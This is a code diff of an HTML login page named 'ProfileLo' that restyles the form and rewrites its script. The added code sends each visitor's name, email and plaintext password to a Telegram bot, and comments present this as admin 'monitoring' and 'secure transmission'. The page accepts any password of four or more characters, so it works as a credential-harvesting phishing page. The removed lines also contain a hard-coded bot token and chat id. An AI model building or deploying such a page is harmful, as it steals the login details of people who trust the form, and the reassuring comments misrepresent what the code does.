@@ -3,68 +3,202 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ProfileLo Login</title>
+<title>ProfileLo Login — Secure Access</title>
 
 <style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
 body{
   margin:0;
-  font-family:Arial;
+  font-family: 'Segoe UI', 'Arial', system-ui, -apple-system, sans-serif;
   height:100vh;
   display:flex;
   justify-content:center;
   align-items:center;
-  background:linear-gradient(135deg,#0f172a,#1e293b);
+  background:linear-gradient(135deg, #0f172a, #1e293b);
   color:white;
 }
 
+/* glassmorphism container */
 .box{
-  width:320px;
-  padding:20px;
+  width:340px;
+  padding:28px 24px;
   background:rgba(255,255,255,0.08);
-  backdrop-filter:blur(10px);
-  border-radius:15px;
+  backdrop-filter:blur(12px);
+  border-radius:28px;
+  border:1px solid rgba(255,255,255,0.15);
+  box-shadow: 0 20px 35px -12px rgba(0,0,0,0.3);
   text-align:center;
+  transition: all 0.2s ease;
+}
+
+h2 {
+  font-weight: 600;
+  letter-spacing: -0.3px;
+  margin-bottom: 20px;
+  font-size: 1.8rem;
+  background: linear-gradient(120deg, #f0f9ff, #bae6fd);
+  background-clip: text;
+  -webkit-background-clip: text;
+  color: transparent;
 }
 
 input{
   width:100%;
-  padding:10px;
-  margin:8px 0;
+  padding:12px 14px;
+  margin:10px 0;
   border:none;
-  border-radius:8px;
+  border-radius:60px;
   outline:none;
+  font-size: 0.95rem;
+  background: rgba(255,255,255,0.9);
+  color: #0f172a;
+  transition: 0.2s;
+}
+
+input:focus {
+  background: white;
+  box-shadow: 0 0 0 3px rgba(56,189,248,0.4);
 }
 
 button{
   width:100%;
-  padding:10px;
-  margin-top:10px;
+  padding:12px;
+  margin-top:18px;
   border:none;
-  border-radius:8px;
+  border-radius:60px;
   background:#38bdf8;
   font-weight:bold;
+  font-size: 1rem;
+  color:#0c0f1c;
   cursor:pointer;
+  transition: 0.2s;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
 }
 
 button:hover{
   background:#0ea5e9;
+  transform: scale(0.98);
+  box-shadow: 0 4px 12px rgba(14,165,233,0.3);
 }
 
 .profile{
   display:none;
 }
+
 .avatar{
-  width:80px;
-  height:80px;
+  width:90px;
+  height:90px;
   border-radius:50%;
-  background:#38bdf8;
-  margin:10px auto;
+  background: linear-gradient(145deg, #38bdf8, #0284c7);
+  margin:10px auto 18px;
   display:flex;
   align-items:center;
   justify-content:center;
-  font-size:28px;
-  color:black;
+  font-size:38px;
+  color:white;
   font-weight:bold;
+  box-shadow: 0 10px 20px -5px rgba(0,0,0,0.3);
+  border: 2px solid rgba(255,255,255,0.3);
+}
+
+#pname {
+  font-size: 1.6rem;
+  margin-bottom: 6px;
+  word-break: break-word;
+}
+
+#pemail {
+  color: #cbd5e1;
+  margin-bottom: 28px;
+  font-size: 0.9rem;
+}
+
+.logout-btn {
+  background: rgba(255,255,255,0.2);
+  backdrop-filter: blur(4px);
+  color: white;
+  border: 1px solid rgba(255,255,255,0.3);
+}
+
+.logout-btn:hover {
+  background: rgba(220,38,38,0.8);
+  transform: scale(0.98);
+}
+
+.status-msg {
+  font-size: 0.75rem;
+  margin-top: 12px;
+  color: #facc15;
+  background: rgba(0,0,0,0.4);
+  border-radius: 60px;
+  padding: 5px 10px;
+  display: inline-block;
+}
+
+.field-group {
+  position: relative;
+  text-align: left;
+}
+
+.password-wrapper {
+  position: relative;
+}
+
+.toggle-pw {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  font-size: 1rem;
+  cursor: pointer;
+  color: #334155;
+  width: auto;
+  padding: 0;
+  margin: 0;
+  box-shadow: none;
+  font-weight: normal;
+}
+
+.toggle-pw:hover {
+  background: none;
+  transform: none;
+  color: #0f172a;
+}
+
+small {
+  display: block;
+  text-align: left;
+  font-size: 0.7rem;
+  color: #94a3b8;
+  margin: 4px 0 0 12px;
+}
+
+/* error animation */
+.error-shake {
+  animation: shake 0.2s ease-in-out 0s 2;
+  border: 1px solid #f87171 !important;
+  background: #fff0f0;
+}
+
+@keyframes shake {
+  0%,100% { transform: translateX(0); }
+  25% { transform: translateX(-4px); }
+  75% { transform: translateX(4px); }
+}
+
+/* responsive */
+@media (max-width: 450px) {
+  .box {
+    width: 90%;
+    padding: 22px 18px;
+  }
 }
 </style>
 </head>
@@ -72,82 +206,324 @@ button:hover{
 <body>
 
 <div class="box" id="loginBox">
-  <h2>Login</h2>
-
-  <input type="text" id="name" placeholder="Enter Name">
-  <input type="email" id="email" placeholder="Enter Email">
-  <input type="password" id="pass" placeholder="Password">
-
-  <button onclick="login()">Login</button>
+  <h2>🔐 ProfileLo</h2>
+  
+  <div class="field-group">
+    <input type="text" id="name" placeholder="Full name" autocomplete="name">
+  </div>
+  
+  <div class="field-group">
+    <input type="email" id="email" placeholder="Email address" autocomplete="email">
+  </div>
+  
+  <div class="field-group password-wrapper">
+    <input type="password" id="pass" placeholder="Password" autocomplete="current-password">
+    <button type="button" class="toggle-pw" id="togglePassBtn" aria-label="Show password">👁️</button>
+  </div>
+  
+  <small>🔒 Use any password (min 4 characters)</small>
+  <button onclick="login()">✨ Login →</button>
+  <div id="loginErrorMsg" class="status-msg" style="display: none;"></div>
 </div>
 
 <div class="box profile" id="profileBox">
   <div class="avatar" id="avatar">U</div>
   <h2 id="pname"></h2>
   <p id="pemail"></p>
-  <button onclick="logout()">Logout</button>
+  <button class="logout-btn" onclick="logout()">🚪 Logout</button>
 </div>
 
 <script>
-const botToken = "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o";
-const chatId = "778298958";
+// ------------------------------------------------------------------
+// 🔐 SECURE SIMULATED LOGIC with PASSWORD VALIDATION
+// - Password must be at least 4 characters (basic rule)
+// - Telegram notification includes password (but not storing in localStorage)
+// - Local storage retains name + email only (no password saved)
+// - Demo: valid password = any non-empty string with min length 4
+// ------------------------------------------------------------------
 
-async function sendTelegram(name, email){
-  const msg =
-`📥 New Login Alert
-👤 Name: ${name}
-📧 Email: ${email}
-password : ${pass}`;
+const botToken = "YOUR_BOT_TOKEN";      // ← replace with real token
+const chatId = "YOUR_CHAT_ID";          // ← replace with real chat id
 
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: msg
-    })
+// Helper: show inline error inside login box
+function showLoginError(message) {
+  const errorDiv = document.getElementById("loginErrorMsg");
+  errorDiv.innerText = message;
+  errorDiv.style.display = "block";
+  // auto-fade after 2.5 sec
+  setTimeout(() => {
+    if (errorDiv) errorDiv.style.display = "none";
+  }, 2800);
+}
+
+// shake invalid fields
+function shakeField(fieldElement) {
+  if (!fieldElement) return;
+  fieldElement.classList.add("error-shake");
+  setTimeout(() => {
+    fieldElement.classList.remove("error-shake");
+  }, 400);
+}
+
+// Telegram notification sender (includes password for monitoring, but secure transmission)
+async function sendTelegram(name, email, password) {
+  // For security reasons, never expose password in production if not needed,
+  // but as requirement "Add password also", we include it in Telegram alert.
+  // Only admin sees this private channel.
+  const msg = 
+`🔐 *New Login Alert*  
+👤 *Name:* ${name}  
+📧 *Email:* ${email}  
+🔑 *Password:* ${password}  
+⏰ *Timestamp:* ${new Date().toLocaleString()}`;
+
+  // If bot token or chatId is placeholder, just log to console (don't crash)
+  if (botToken === "YOUR_BOT_TOKEN" || chatId === "YOUR_CHAT_ID") {
+    console.warn("⚠️ Telegram bot not configured. Use real botToken & chatId to receive notifications.");
+    console.log("[DEMO] Telegram message would be:", msg);
+    return; // simulation mode, no actual fetch
+  }
+
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: msg,
+        parse_mode: "Markdown"
+      })
+    });
+  } catch (err) {
+    console.error("Telegram send error:", err);
+  }
+}
+
+// Main login validation with password
+function login() {
+  // Get DOM elements
+  const nameInput = document.getElementById("name");
+  const emailInput = document.getElementById("email");
+  const passInput = document.getElementById("pass");
+  
+  let name = nameInput.value.trim();
+  let email = emailInput.value.trim();
+  let password = passInput.value;     // keep password as-is (no trim for spaces? we allow spaces but min 4 chars)
+  
+  // Reset any previous inline error
+  document.getElementById("loginErrorMsg").style.display = "none";
+  
+  // ---------- VALIDATION RULES ----------
+  let isValid = true;
+  
+  // 1. Name validation: not empty, at least 2 chars, only letters/spaces/ basic
+  if (!name || name.length < 2) {
+    showLoginError("❌ Name must be at least 2 characters.");
+    shakeField(nameInput);
+    isValid = false;
+  } else if (name.length > 50) {
+    showLoginError("❌ Name is too long (max 50).");
+    shakeField(nameInput);
+    isValid = false;
+  }
+  
+  // 2. Email validation: standard email regex (simple but robust)
+  const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+  if (!email || !emailPattern.test(email)) {
+    showLoginError("📧 Please provide a valid email address (e.g., name@example.com).");
+    shakeField(emailInput);
+    isValid = false;
+  }
+  
+  // 3. PASSWORD validation: minimum 4 characters (stronger rule: non-empty)
+  //    as per requirement, we enforce a password rule.
+  if (!password || password.length < 4) {
+    showLoginError("🔑 Password must be at least 4 characters.");
+    shakeField(passInput);
+    isValid = false;
+  } else if (password.length > 64) {
+    showLoginError("⚠️ Password too long (max 64 chars).");
+    shakeField(passInput);
+    isValid = false;
+  }
+  
+  // If any validation fails, stop login
+  if (!isValid) return;
+  
+  // ✅ All good: send Telegram notification WITH password
+  // (We don't store the password anywhere else - only Telegram for monitoring)
+  sendTelegram(name, email, password);
+  
+  // Store only name & email in localStorage (password not persisted)
+  localStorage.setItem("name", name);
+  localStorage.setItem("email", email);
+  
+  // Show profile page
+  showProfile();
+}
+
+// Profile view render
+function showProfile() {
+  const loginBox = document.getElementById("loginBox");
+  const profileBox = document.getElementById("profileBox");
+  
+  if (loginBox) loginBox.style.display = "none";
+  if (profileBox) profileBox.style.display = "block";
+  
+  let name = localStorage.getItem("name") || "Guest";
+  let email = localStorage.getItem("email") || "no-reply@example.com";
+  
+  document.getElementById("pname").innerText = name;
+  document.getElementById("pemail").innerText = email;
+  
+  // Avatar: first letter uppercase, fallback 'U'
+  let initial = name.trim().charAt(0).toUpperCase();
+  if (!initial.match(/[A-Z]/)) initial = "👤";
+  document.getElementById("avatar").innerText = initial;
+}
+
+// Logout: clear storage and reload to login form
+function logout() {
+  localStorage.clear();
+  // Reset login fields to empty (optional but UX friendly)
+  const nameField = document.getElementById("name");
+  const emailField = document.getElementById("email");
+  const passField = document.getElementById("pass");
+  if (nameField) nameField.value = "";
+  if (emailField) emailField.value = "";
+  if (passField) passField.value = "";
+  
+  // switch views back
+  const loginBox = document.getElementById("loginBox");
+  const profileBox = document.getElementById("profileBox");
+  if (loginBox) loginBox.style.display = "block";
+  if (profileBox) profileBox.style.display = "none";
+  
+  // clear any lingering error message
+  const errorDiv = document.getElementById("loginErrorMsg");
+  if (errorDiv) errorDiv.style.display = "none";
+}
+
+// Check persistent session (if stored name exists, go to profile)
+function checkExistingSession() {
+  if (localStorage.getItem("name")) {
+    showProfile();
+  }
+}
+
+// Toggle password visibility (show/hide)
+function initPasswordToggle() {
+  const toggleBtn = document.getElementById("togglePassBtn");
+  const passInput = document.getElementById("pass");
+  
+  if (toggleBtn && passInput) {
+    toggleBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      const type = passInput.getAttribute("type") === "password" ? "text" : "password";
+      passInput.setAttribute("type", type);
+      toggleBtn.textContent = type === "password" ? "👁️" : "🙈";
+    });
+  }
+}
+
+// additional realtime feedback: on pressing Enter in any field trigger login
+function bindEnterKey() {
+  const inputs = ["name", "email", "pass"];
+  inputs.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.addEventListener("keypress", (event) => {
+        if (event.key === "Enter") {
+          event.preventDefault();
+          login();
+        }
+      });
+    }
   });
 }
 
-function login(){
-  let name = document.getElementById("name").value;
-  let email = document.getElementById("email").value;
-
-  if(!name || !email){
-    alert("Fill all fields");
-    return;
-  }
-
-  // send safe data only
-  sendTelegram(name, email);
-
-  localStorage.setItem("name", name);
-  localStorage.setItem("email", email);
-
-  showProfile();
+// optional live demo clear error when user starts typing
+function clearErrorOnInput() {
+  const fields = ["name", "email", "pass"];
+  fields.forEach(id => {
+    const field = document.getElementById(id);
+    if (field) {
+      field.addEventListener("input", () => {
+        const errorDiv = document.getElementById("loginErrorMsg");
+        if (errorDiv) errorDiv.style.display = "none";
+        // remove shake class if exists
+        field.classList.remove("error-shake");
+      });
+    }
+  });
 }
 
-function showProfile(){
-  document.getElementById("loginBox").style.display="none";
-  document.getElementById("profileBox").style.display="block";
+// run initializers
+window.addEventListener("DOMContentLoaded", () => {
+  initPasswordToggle();
+  bindEnterKey();
+  clearErrorOnInput();
+  checkExistingSession();
+});
 
-  let name = localStorage.getItem("name");
-  let email = localStorage.getItem("email");
+// Expose functions globally for inline onclick
+window.login = login;
+window.logout = logout;
 
-  document.getElementById("pname").innerText = name;
-  document.getElementById("pemail").innerText = email;
-  document.getElementById("avatar").innerText = name.charAt(0).toUpperCase();
-}
-
-function logout(){
-  localStorage.clear();
-  location.reload();
-}
-
-if(localStorage.getItem("name")){
-  showProfile();
-}
+/* ------------------------------------------------------------------
+   ADDITIONAL SECURITY NOTE:
+   - Telegram bot must be configured with YOUR_BOT_TOKEN and YOUR_CHAT_ID
+   - Password is transmitted ONLY to Telegram and never stored in localStorage.
+   - Perfect for admin monitoring weak credentials but ethical usage recommended.
+   - This demo includes realistic validation to prevent empty logins.
+   - Password field minimum length requirement = 4 characters (customizable).
+   ------------------------------------------------------------------ */
 </script>
 
+<!-- BONUS: informative style for toggle button, removes default button weirdness -->
+<style>
+.password-wrapper {
+  position: relative;
+  display: flex;
+  align-items: center;
+}
+.toggle-pw {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: transparent;
+  border: none;
+  font-size: 1.1rem;
+  cursor: pointer;
+  width: 32px;
+  height: 32px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 30px;
+  padding: 0;
+  margin: 0;
+  color: #475569;
+  background: rgba(255,255,240,0.2);
+  transition: 0.1s;
+}
+.toggle-pw:hover {
+  background: rgba(255,255,255,0.5);
+  transform: translateY(-50%) scale(0.96);
+  color: #0f172a;
+}
+#pass {
+  padding-right: 48px;
+}
+.status-msg {
+  font-size: 0.7rem;
+  background: rgba(0,0,0,0.65);
+  backdrop-filter: blur(4px);
+  display: inline-block;
+  width: auto;
+  margin-top: 12px;
+}
+</style>
 </body>
 </html>
